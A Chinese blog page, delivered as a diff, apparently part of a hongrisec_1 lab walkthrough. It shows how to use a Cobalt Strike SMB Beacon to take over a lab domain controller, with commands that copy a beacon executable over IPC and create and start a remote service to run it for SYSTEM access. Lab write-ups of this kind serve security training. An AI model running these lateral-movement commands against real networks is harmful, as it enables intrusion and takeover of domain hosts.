@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透） - 黄泽杰Ekko</title><meta name="Description" content="Ekko"><meta property="og:title" content="Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透）" />
+<meta property="og:description" content="Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透） 在web服务器和域控之间建立流量隧道 为什么建立了ipc通道还要建立流量隧道
+因为ipc只能传文件，不能传流量
+SMB Beacon简介: SMB Beacon使用命名管道通过父级Beacon进行通讯
+当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送
+使用CS工具中的SMB Beacon 使用SMB 新建一个监听器，用作smb隧道 明确总体思路：
+在cs上生成smb木马 通过AntSword上传文件到web服务器 web服务器通过ipc管道将木马文件上传到域控主机 域控主机执行文件，与web服务器建立smb隧道 流量再通过web服务器回到cs 上传smb木马到web服务器
+通过ipc管道上传文件到域控主机
+shell copy smb_beacon.exe \\192.168.52.138\C$ 通过ipc管道在域控主机下创建一个服务，执行木马
+shell sc \\owa.god.org create test binpath= &#34;cmd.exe /c c:\smb_beacon.exe&#34; 开启服务
+shell sc \\owa.god.org start test 域控启动smb服务，web服务器也要发送连接命令，才能建立smb隧道
+link owa.god.org 哪怕报1053错误，也可以link到，接下来成功上线
+上线成功，拿到owa，system权限" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://sxzl798.github.io/hongrisec_1/12.p29media-note-%E4%BD%BF%E7%94%A8cs%E8%87%AA%E5%B8%A6smb-beacon%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8/" /><meta property="article:section" content="hongrisec_1" />
+<meta property="article:published_time" content="2024-10-10T11:35:24+08:00" />
+<meta property="article:modified_time" content="2024-10-10T11:35:24+08:00" /><meta property="og:site_name" content="Ekko" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透）"/>
+<meta name="twitter:description" content="Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透） 在web服务器和域控之间建立流量隧道 为什么建立了ipc通道还要建立流量隧道
+因为ipc只能传文件，不能传流量
+SMB Beacon简介: SMB Beacon使用命名管道通过父级Beacon进行通讯
+当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送
+使用CS工具中的SMB Beacon 使用SMB 新建一个监听器，用作smb隧道 明确总体思路：
+在cs上生成smb木马 通过AntSword上传文件到web服务器 web服务器通过ipc管道将木马文件上传到域控主机 域控主机执行文件，与web服务器建立smb隧道 流量再通过web服务器回到cs 上传smb木马到web服务器
+通过ipc管道上传文件到域控主机
+shell copy smb_beacon.exe \\192.168.52.138\C$ 通过ipc管道在域控主机下创建一个服务，执行木马
+shell sc \\owa.god.org create test binpath= &#34;cmd.exe /c c:\smb_beacon.exe&#34; 开启服务
+shell sc \\owa.god.org start test 域控启动smb服务，web服务器也要发送连接命令，才能建立smb隧道
+link owa.god.org 哪怕报1053错误，也可以link到，接下来成功上线
+上线成功，拿到owa，system权限"/>
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://sxzl798.github.io/hongrisec_1/12.p29media-note-%E4%BD%BF%E7%94%A8cs%E8%87%AA%E5%B8%A6smb-beacon%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8/" /><link rel="prev" href="http://sxzl798.github.io/hongrisec_1/10.p27media-note-%E8%9A%81%E5%89%91%E5%88%B0cs%E7%9A%84%E8%BF%81%E7%A7%BB%E4%B8%8A%E7%BA%BF/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透）",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/sxzl798.github.io\/hongrisec_1\/12.p29media-note-%E4%BD%BF%E7%94%A8cs%E8%87%AA%E5%B8%A6smb-beacon%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8\/"
+        },"genre": "hongrisec_1","keywords": "hongrisec_1靶场","wordcount":  47 ,
+        "url": "http:\/\/sxzl798.github.io\/hongrisec_1\/12.p29media-note-%E4%BD%BF%E7%94%A8cs%E8%87%AA%E5%B8%A6smb-beacon%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8\/","datePublished": "2024-10-10T11:35:24+08:00","dateModified": "2024-10-10T11:35:24+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "黄泽杰"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="黄泽杰Ekko">黄泽杰Ekko</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="黄泽杰Ekko">黄泽杰Ekko</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透）</h1><div class="content" id="content"><h1 id="part10使用cs自带的smb-beacon上线内网域控主机内网穿透">Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透）</h1>
+<h3 id="在web服务器和域控之间建立流量隧道">在web服务器和域控之间建立流量隧道</h3>
+<p>为什么建立了ipc通道还要建立流量隧道</p>
+<p>因为ipc只能传文件，不能传流量</p>
+<p>SMB Beacon简介:
+SMB Beacon使用命名管道通过父级Beacon进行通讯</p>
+<p>当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送</p>
+<h3 id="使用cs工具中的smb-beacon">使用CS工具中的SMB Beacon</h3>
+<p>使用SMB
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171730181.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171730181.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171730181.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171730181.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171730181.png"
+        title="image.png" />
+新建一个监听器，用作smb隧道
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171732263.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171732263.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171732263.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171732263.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171732263.png"
+        title="image.png" />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171733740.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171733740.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171733740.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171733740.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171733740.png"
+        title="image.png" />
+<strong>明确总体思路</strong>：</p>
+<ol>
+<li>在cs上生成smb木马</li>
+<li>通过AntSword上传文件到web服务器</li>
+<li>web服务器通过ipc管道将木马文件上传到域控主机</li>
+<li>域控主机执行文件，与web服务器建立smb隧道</li>
+<li>流量再通过web服务器回到cs</li>
+</ol>
+<p>上传smb木马到web服务器</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171738800.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171738800.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171738800.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171738800.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171738800.png"
+        title="image.png" />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171739300.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171739300.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171739300.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171739300.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171739300.png"
+        title="image.png" />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171739414.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171739414.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171739414.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171739414.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171739414.png"
+        title="image.png" />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171740018.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171740018.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171740018.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171740018.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171740018.png"
+        title="image.png" /></p>
+<p>通过ipc管道上传文件到域控主机</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shell copy smb_beacon.exe <span class="se">\\</span>192.168.52.138<span class="se">\C</span>$
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171742533.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171742533.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171742533.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171742533.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171742533.png"
+        title="image.png" />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171749786.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171749786.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171749786.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171749786.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171749786.png"
+        title="image.png" /></p>
+<p>通过ipc管道在域控主机下创建一个服务，执行木马</p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171833393.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171833393.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171833393.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171833393.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171833393.png"
+        title="image.png" /><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shell sc <span class="se">\\</span>owa.god.org create <span class="nb">test</span> <span class="nv">binpath</span><span class="o">=</span> <span class="s2">&#34;cmd.exe /c c:\smb_beacon.exe&#34;</span> 
+</span></span></code></pre></div><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171756074.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171756074.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171756074.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171756074.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171756074.png"
+        title="image.png" /><p>开启服务</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shell sc <span class="se">\\</span>owa.god.org start <span class="nb">test</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171842014.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171842014.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171842014.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409171842014.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409171842014.png"
+        title="image.png" />
+域控启动smb服务，web服务器也要发送连接命令，才能建立smb隧道</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">link owa.god.org
+</span></span></code></pre></div><p>哪怕报1053错误，也可以link到，接下来成功上线</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/huangzejie/drawing-bed/raw/master/202409181118339.png"
+        data-srcset="https://gitee.com/huangzejie/drawing-bed/raw/master/202409181118339.png, https://gitee.com/huangzejie/drawing-bed/raw/master/202409181118339.png 1.5x, https://gitee.com/huangzejie/drawing-bed/raw/master/202409181118339.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/huangzejie/drawing-bed/raw/master/202409181118339.png"
+        title="image.png" />
+<strong>上线成功，拿到owa，system权限</strong></p>
+</div></div></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">黄泽杰</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
